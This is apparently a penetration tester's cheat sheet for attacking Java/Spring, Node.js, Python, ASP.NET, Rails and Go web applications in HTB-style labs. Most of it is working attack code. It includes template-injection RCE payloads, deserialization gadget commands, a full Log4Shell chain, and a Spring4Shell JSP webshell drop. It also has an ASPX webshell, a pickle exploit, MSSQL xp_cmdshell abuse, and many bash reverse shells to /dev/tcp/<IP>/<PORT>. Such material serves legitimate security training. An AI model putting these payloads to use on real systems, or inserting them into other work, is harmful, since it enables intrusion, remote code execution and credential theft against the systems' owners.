# Non-PHP Web App Attacks

#WebAttacks #SSTI #Deserialization #Java #NodeJS #Python #DotNET #RubyOnRails

## What is this?

Attack reference for non-PHP stacks commonly encountered in HTB boxes and labs. PHP has wrappers and log poisoning for easy LFI→RCE — other stacks require different chains. Key techniques: SSTI, insecure deserialization, framework-specific misconfigs.

---

## Stack Fingerprinting

Identify the backend before attacking — technique selection depends entirely on the stack.

```bash
# HTTP headers
curl -sI http://target.com | grep -iE "server|x-powered-by|x-aspnet|x-runtime"

# Wappalyzer (browser extension) or whatweb
whatweb http://target.com
whatweb -a 3 http://target.com    # aggressive mode

# Cookie names are strong indicators
# JSESSIONID      → Java
# ASP.NET_SessionId, .ASPXAUTH → ASP.NET
# rack.session    → Ruby/Rack
# session         → Flask/Express (generic)

# File extensions in URLs
# .jsp, .do, .action → Java
# .aspx, .ashx, .asmx → ASP.NET
# .py (rare), no extension → Python/Node/Go

# Error pages — framework errors leak stack info
curl http://target.com/nonexistent -v

# Response timing + headers
# X-Powered-By: Express → Node.js
# X-Powered-By: ASP.NET → .NET
# X-Content-Type-Options + no X-Powered-By → possibly Go

# Feroxbuster/gobuster with extension targeting
feroxbuster -u http://target.com -x jsp,do,aspx,py,rb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

---

## Java / Spring Boot

### Fingerprinting

```bash
# Cookies: JSESSIONID
# Extensions: .jsp, .do, .action, /api/ (Spring REST)
# Headers: X-Application-Context (old Spring Boot)
# Actuator endpoints: /actuator, /env, /health, /info
curl http://target.com/actuator 2>/dev/null | python3 -m json.tool
```

### Spring Boot Actuator (Unauthenticated Exposure)

Actuator exposes management endpoints — commonly misconfigured to be public.

```bash
curl http://target.com/actuator/env             # All env vars + config values (creds, keys)
curl http://target.com/actuator/configprops     # App configuration
curl http://target.com/actuator/mappings        # All URL routes — find hidden endpoints
curl http://target.com/actuator/beans           # All Spring beans
curl http://target.com/actuator/logfile         # Application log — may contain creds
curl http://target.com/actuator/heapdump        # JVM heap dump — mine for secrets
curl http://target.com/actuator/shutdown -XPOST # Kill the app (if enabled)
curl http://target.com/actuator/restart -XPOST  # Restart (triggers env var reload)
```

```bash
# Extract secrets from heapdump
strings heapdump.hprof | grep -iE "password|secret|token|key|api|aws|jdbc"

# Full heap analysis with Eclipse MAT or jhat
jhat heapdump.hprof    # browse at http://localhost:7000
```

**Actuator → RCE via `/env` + `/restart`:**

```bash
# 1. Set a property that triggers code execution on restart
# Example: spring.datasource.url with H2 INIT parameter
curl -X POST http://target.com/actuator/env \
  -H "Content-Type: application/json" \
  -d '{"name":"spring.datasource.url","value":"jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '\''http://<AttackerIP>/evil.sql'\''"}'

curl -X POST http://target.com/actuator/restart
```

### SSTI — Thymeleaf / Freemarker / Pebble / Velocity

**Detect:** Submit `${7*7}`, `#{7*7}`, `*{7*7}` in any user-controlled field rendered server-side.

**Thymeleaf (Spring MVC):**

```bash
# Detection — if 49 appears in response:
__${7*7}__::__

# RCE payload
__${T(java.lang.Runtime).getRuntime().exec('id')}__::__

# URL parameter
?search=__${T(java.lang.Runtime).getRuntime().exec('id')}__::__

# Better — use ProcessBuilder for args with spaces
__${T(java.lang.ProcessBuilder).new(new String[]{"bash","-c","bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"}).start()}__::__
```

**Freemarker:**

```bash
# Detection
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'")}
```

**Pebble:**

```bash
# Detection
{{7*7}}

# RCE
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke((1).TYPE.forName('java.lang.Runtime').methods[7].invoke(null),cmd.split(' ')) %}
```

**Velocity:**

```java
// RCE
#set($r=$Runtime.exec("id"))
#set($o=$r.inputStream.newReader())
#set($line=$o.readLine())
$line
```

### Java Deserialization

**Detection:** Look for serialized Java objects — base64 blob starting with `rO0AB` or raw bytes `AC ED 00 05`.

```bash
# Common locations: cookies, POST body, hidden form fields, custom headers
# Check cookie for base64 blob
echo "<cookie_value>" | base64 -d | xxd | head    # look for AC ED 00 05

# Tool: ysoserial
java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w 0

# Generate reverse shell payload
java -jar ysoserial.jar CommonsCollections6 'bash -c {bash,-i,>&,/dev/tcp/<IP>/<PORT>,0>&1}' | base64 -w 0

# Delivery — replace cookie/parameter with payload
curl http://target.com/ --cookie "session=<base64_payload>"
```

**Gadget chain selection** (try in order):

```
CommonsCollections6    → most universal, no version constraint
CommonsCollections1    → older CC versions
Spring1 / Spring2      → Spring Framework targets
URLDNS                 → detection only (DNS callback, no exec)
```

```bash
# Detection via DNS callback (no RCE, just confirms deserialization)
java -jar ysoserial.jar URLDNS "http://<BurpCollaborator>" | base64 -w 0
```

### Log4Shell (CVE-2021-44228)

Any user-controlled string logged by Log4j 2.x < 2.15.0.

```bash
# Basic detection — inject into any header/parameter
curl http://target.com/ -H 'X-Api-Version: ${jndi:ldap://<BurpCollaborator>/a}'
curl http://target.com/ -H 'User-Agent: ${jndi:ldap://<AttackerIP>:1389/a}'

# Test all common headers
for header in "X-Forwarded-For" "User-Agent" "Referer" "X-Api-Version" "Accept-Language"; do
    curl -sI http://target.com/ -H "$header: \${jndi:ldap://<BurpCollaborator>/a}"
done

# Full exploit chain
# 1. Start LDAP redirect server (marshalsec)
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<AttackerIP>:8000/#Exploit"

# 2. Compile exploit class
cat > Exploit.java << 'EOF'
public class Exploit {
    static { try { Runtime.getRuntime().exec("bash -c {bash,-i,>&,/dev/tcp/<IP>/<PORT>,0>&1}"); } catch (Exception e) {} }
}
EOF
javac Exploit.java
python3 -m http.server 8000

# 3. Trigger
curl http://target.com/ -H 'User-Agent: ${jndi:ldap://<AttackerIP>:1389/a}'
```

### Spring4Shell (CVE-2022-22965)

Spring MVC with JDK 9+, Tomcat as WAR deployment.

```bash
# Exploit — write a JSP webshell
curl -X POST http://target.com/vuln-endpoint \
  -d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&c1=Runtime&c2=<%&suffix=%%>%0A'

# Access the dropped shell
curl "http://target.com/tomcatwar.jsp?pwd=j&cmd=id"
```

---

## NodeJS / Express

### Fingerprinting

```bash
# Headers: X-Powered-By: Express
# Cookies: connect.sid (express-session)
# Errors: "Cannot GET /path" (Express default 404)
# package.json if exposed: curl http://target.com/package.json
```

### SSTI — Pug / EJS / Handlebars / Nunjucks

**Detect:** Submit `{{7*7}}`, `#{7*7}`, `<%= 7*7 %>` in any rendered field.

**Pug (formerly Jade):**

```bash
# Detection — if 49 in response:
#{7*7}

# RCE
#{function(){localLoad=global.process.mainModule.constructor._resolveFilename('child_process');child_process=require(localLoad);return child_process.execSync('id').toString();}()}

# Simpler
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id')
```

**EJS:**

```bash
# Detection
<%= 7*7 %>

# RCE
<%= require('child_process').execSync('id').toString() %>

# URL-encoded in parameter
?name=<%25%3D+require('child_process').execSync('id').toString()+%25>
```

**Handlebars:**

```bash
# Detection
{{7*7}}

# RCE (prototype pollution path)
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id').toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

**Nunjucks:**

```bash
# RCE
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
```

### Prototype Pollution

If user input merges into objects without sanitization:

```javascript
// Vulnerable pattern
merge(obj, JSON.parse(userInput))
```

```bash
# Test via parameter pollution
POST /api/user
{"__proto__":{"admin":true}}
{"constructor":{"prototype":{"admin":true}}}

# Check if pollution worked
GET /api/user → check if admin:true now appears

# RCE via prototype pollution → SSTI or child_process (app-specific)
```

### Node.js Deserialization (node-serialize)

```bash
# Detect: serialized object in cookie (JSON with _$$ND_FUNC$$_ keys)
echo "<cookie>" | base64 -d    # look for _$$ND_FUNC$$_

# Generate payload (nodejsshell.py or manual)
# Payload structure:
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \"bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\"')}()"}

# Base64 encode and send as cookie
echo '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}' | base64 -w 0
```

---

## Python / Flask / Django

### Fingerprinting

```bash
# Headers: (usually none, but sometimes X-Powered-By or Server: Werkzeug)
# Cookies: session (Flask JWT-like cookie), csrftoken + sessionid (Django)
# Error pages: Werkzeug debugger (yellow), Django yellow debug page
# Paths: /admin (Django admin), /static/, /media/
curl -sI http://target.com | grep -i "werkzeug\|django\|python"
```

### SSTI — Jinja2 (Flask/Django)

```bash
# Detection — submit in any rendered field, URL param, header
{{7*7}}          # → 49
{{7*'7'}}        # → 7777777 (Jinja2 specific)
${7*7}           # → for Mako/other engines

# RCE — Jinja2
# via config object (Flask)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# via class traversal (universal Jinja2)
{{''.__class__.__mro__[1].__subclasses__()}}   # list all subclasses
# Find index of <class 'subprocess.Popen'> then:
{{''.__class__.__mro__[1].__subclasses__()[<INDEX>](['id'],stdout=-1).communicate()}}

# Shorter RCE
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Reverse shell
{{request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"').read()}}
```

**tplmap** (automated SSTI exploitation):

```bash
python3 tplmap.py -u 'http://target.com/?name=*'
python3 tplmap.py -u 'http://target.com/?name=*' --os-shell
python3 tplmap.py -u 'http://target.com/' --data 'name=*'   # POST
```

### Werkzeug Debugger (Flask debug=True)

Interactive Python console exposed at `/__debugger__` — requires PIN.

```bash
# Check if debugger is active (look for Werkzeug in error response)
curl http://target.com/nonexistent

# PIN generation — collect these values from the target via LFI/path traversal:
curl 'http://target.com/lfi?file=/etc/machine-id'           # or /proc/sys/kernel/random/boot_id
curl 'http://target.com/lfi?file=/proc/self/cgroup'         # extract container ID if Docker
curl 'http://target.com/lfi?file=/proc/self/cmdline'        # get app path
curl 'http://target.com/lfi?file=/sys/class/net/eth0/address'  # MAC address

# Calculate PIN with PoC script (modify values per target):
python3 werkzeug_pin.py   # many PoC scripts available on GitHub
# Then: http://target.com/__debugger__ → enter PIN → Python console → RCE
```

### Pickle Deserialization

```python
# Detection: base64/binary blob in cookie or POST, unpickled server-side
# Generate payload
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

```bash
# Send as cookie or POST parameter
curl http://target.com/ --cookie "data=<base64_payload>"
```

### Django Secret Key → Session Forgery

```bash
# If you find SECRET_KEY (via LFI, source exposure, .env):
# Forge Django session to become any user (including admin)

pip install django
python3 -c "
import django.core.signing as signing
import django.contrib.sessions.backends.signed_cookies as sc

# Forge session for user ID 1 (usually superuser)
data = {'_auth_user_id': '1', '_auth_user_backend': 'django.contrib.auth.backends.ModelBackend', '_auth_user_hash': ''}
print(signing.dumps(data, key='<SECRET_KEY>', salt='django.contrib.sessions.backends.signed_cookies'))
"
# Set the output as sessionid cookie
```

---

## ASP.NET / .NET Core

### Fingerprinting

```bash
# Cookies: ASP.NET_SessionId, .ASPXAUTH, __RequestVerificationToken
# Headers: X-Powered-By: ASP.NET, X-AspNet-Version
# Extensions: .aspx, .ashx, .asmx, .svc
# Paths: /elmah.axd (error log), /trace.axd (trace viewer)
curl -sI http://target.com | grep -iE "aspnet|powered-by"
```

### ASPX Webshell

If you can write a file to the web root (via upload bypass, SQLi, path traversal write):

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    string cmd = Request.QueryString["cmd"];
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
%>
```

```bash
# Access
curl "http://target.com/shell.aspx?cmd=whoami"
```

### ViewState Deserialization (machineKey)

If `enableViewStateMac=false` OR you have the `machineKey` from `web.config`:

```bash
# 1. Get machineKey from web.config via path traversal
curl 'http://target.com/lfi?file=../../../../inetpub/wwwroot/web.config'
# Extract: <machineKey decryptionKey="..." validationKey="..." decryption="AES" validation="SHA1"/>

# 2. Generate payload with ysoserial.net
ysoserial.exe -p ViewState \
  -g TextFormattingRunProperties \
  --decryptionalg="AES" \
  --decryptionkey="<decryptionKey>" \
  --validationalg="SHA1" \
  --validationkey="<validationKey>" \
  -c "powershell -e <b64_encoded_reverse_shell>"

# 3. Submit payload in __VIEWSTATE POST parameter to any .aspx page
curl -X POST http://target.com/page.aspx \
  -d "__VIEWSTATE=<payload>&__VIEWSTATEGENERATOR=<generator_value>"
```

### .NET Insecure Deserialization

**BinaryFormatter / ObjectStateFormatter / LosFormatter:**

```bash
# Generate gadget chain with ysoserial.net
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "whoami"
ysoserial.exe -f LosFormatter -g TextFormattingRunProperties -o base64 -c "cmd /c whoami"
ysoserial.exe -f SoapFormatter -g ActivitySurrogateSelector -o base64 -c "whoami"

# Json.NET with TypeNameHandling (common in .NET APIs)
# Detection: JSON with "$type" key in request/response
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList","$values":["cmd","/c whoami"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}
```

### SQL Injection → xp_cmdshell (MSSQL)

Common with .NET apps on MSSQL.

```bash
# Test for SQLi first (standard)
# If SA or sysadmin role:

# Enable xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --

# Execute command
'; EXEC xp_cmdshell 'whoami'; --

# Reverse shell via xp_cmdshell
'; EXEC xp_cmdshell 'powershell -e <b64_payload>'; --

# Via SQLMap
sqlmap -u "http://target.com/page?id=1" --os-shell --dbms=mssql
```

### Padding Oracle

```bash
# Tool: padbuster
padbuster http://target.com/ "<encrypted_cookie>" 8 -cookies "auth=<cookie>" -encoding 0

# Forge plaintext value
padbuster http://target.com/ "<encrypted_cookie>" 8 -cookies "auth=<cookie>" -encoding 0 -plaintext "admin=1"
```

### ELMAH / Trace.axd (Information Disclosure)

```bash
curl http://target.com/elmah.axd       # Exception log — stack traces, connection strings
curl http://target.com/trace.axd       # Request trace — headers, session data
curl http://target.com/ScriptResource.axd?d=...  # May reveal .NET version
```

---

## Ruby on Rails

### Fingerprinting

```bash
# Cookies: _<appname>_session (base64 encoded)
# Headers: X-Runtime (response time in seconds), X-Request-Id
# Paths: /rails/info (dev mode), /rails/mailers
# Errors: Red Rails error page with stack trace
```

### SSTI — ERB

```bash
# Detection
<%= 7*7 %>

# RCE
<%= `id` %>
<%= system("id") %>
<%= IO.popen('id').readlines() %>

# Reverse shell
<%= system("bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'") %>
```

### Ruby Deserialization (Marshal)

```bash
# Detection: binary blob in cookie (Rails < 4 used Marshal by default)
# Generate payload with universal-deserialisation-gadget or ysoserial-ruby

# Check cookie - if not a JWT and not JSON, may be Marshal
echo "<cookie>" | base64 -d | file -

# Ruby Marshal RCE PoC (simplified)
ruby -e "
require 'base64'
payload = Marshal.dump(Gem::SpecFetcher.new)  # gadget chain varies
puts Base64.encode64(payload)
"
```

### Mass Assignment

```bash
# Rails protects attributes with strong parameters (modern) but older apps may not
# Try adding admin/role parameters to any user creation/update request

POST /users
{"user":{"username":"attacker","password":"pass","admin":true}}
{"user":{"username":"attacker","password":"pass","role":"admin"}}

# Or as form fields
username=attacker&password=pass&user[admin]=1&user[role]=admin
```

---

## Go

### Fingerprinting

```bash
# No X-Powered-By typically
# Binaries served statically, minimal headers
# Paths: often RESTful /api/v1/ structure
# Error format: plain JSON {"error":"..."} or Go panic output
```

### Path Traversal

```bash
# Go's filepath.Join sanitizes ../../ BUT Clean() doesn't always prevent attacks
curl 'http://target.com/static/../../../../etc/passwd'
curl 'http://target.com/files?name=../../../etc/passwd'

# Null byte (Go < 1.6)
curl 'http://target.com/files?name=../../../etc/passwd%00.txt'
```

### SSTI — Go html/template vs text/template

If `text/template` is used instead of `html/template` (or `Execute` vs `ExecuteTemplate`):

```bash
# Detection
{{.}}               # reflects current data object
{{printf "%s" .}}

# RCE (if template receives OS/exec access — rare by default, depends on app)
# More commonly: read arbitrary struct fields
{{.Password}}
{{.SecretKey}}
{{.Config.DBPassword}}
```

---

## Tools Reference

| Tool | Use |
|------|-----|
| [tplmap](https://github.com/epinna/tplmap) | Automated SSTI detection + exploitation (multi-engine) |
| [ysoserial](https://github.com/frohoff/ysoserial) | Java deserialization gadget chain generator |
| [ysoserial.net](https://github.com/pwntester/ysoserial.net) | .NET deserialization + ViewState payloads |
| [marshalsec](https://github.com/mbechler/marshalsec) | Java JNDI/LDAP redirect for Log4Shell |
| [whatweb](https://github.com/urbanadventurer/WhatWeb) | Web stack fingerprinting |
| [Wappalyzer](https://www.wappalyzer.com/) | Browser extension — passive stack detection |
| [padbuster](https://github.com/AonCyberLabs/PadBuster) | Padding oracle attacks |
| [sqlmap](https://sqlmap.org/) | SQL injection → xp_cmdshell for MSSQL |
| [Burp Suite](https://portswigger.net/) | Manual testing, Intruder for brute-forcing parameters |

---

## Quick Attack Decision Tree

```
Identify stack (whatweb, headers, cookies, error pages)
│
├── Java / Spring
│   ├── /actuator exposed?          → dump env, heapdump → extract creds/keys
│   ├── User input rendered?        → SSTI (Thymeleaf/Freemarker)
│   ├── Serialized object in param? → ysoserial (CC6 first)
│   └── Log4j version < 2.15?       → Log4Shell JNDI
│
├── NodeJS
│   ├── User input in template?     → SSTI (Pug/EJS/Handlebars)
│   ├── JSON merge without sanity?  → Prototype pollution
│   └── Serialized cookie?          → node-serialize RCE
│
├── Python / Flask
│   ├── User input rendered?        → SSTI Jinja2
│   ├── Debugger active?            → Werkzeug PIN → RCE
│   └── Pickle in cookie/param?     → pickle deserialization
│
├── ASP.NET
│   ├── web.config readable?        → machineKey → ViewState RCE
│   ├── File upload to web root?    → ASPX webshell
│   ├── MSSQL backend?              → SQLi → xp_cmdshell
│   └── Encrypted cookie?           → padding oracle
│
└── Ruby on Rails
    ├── User input in template?     → ERB SSTI
    ├── Old Rails (< 4)?            → Marshal deserialization
    └── User creation/update?       → mass assignment (admin:true)
```
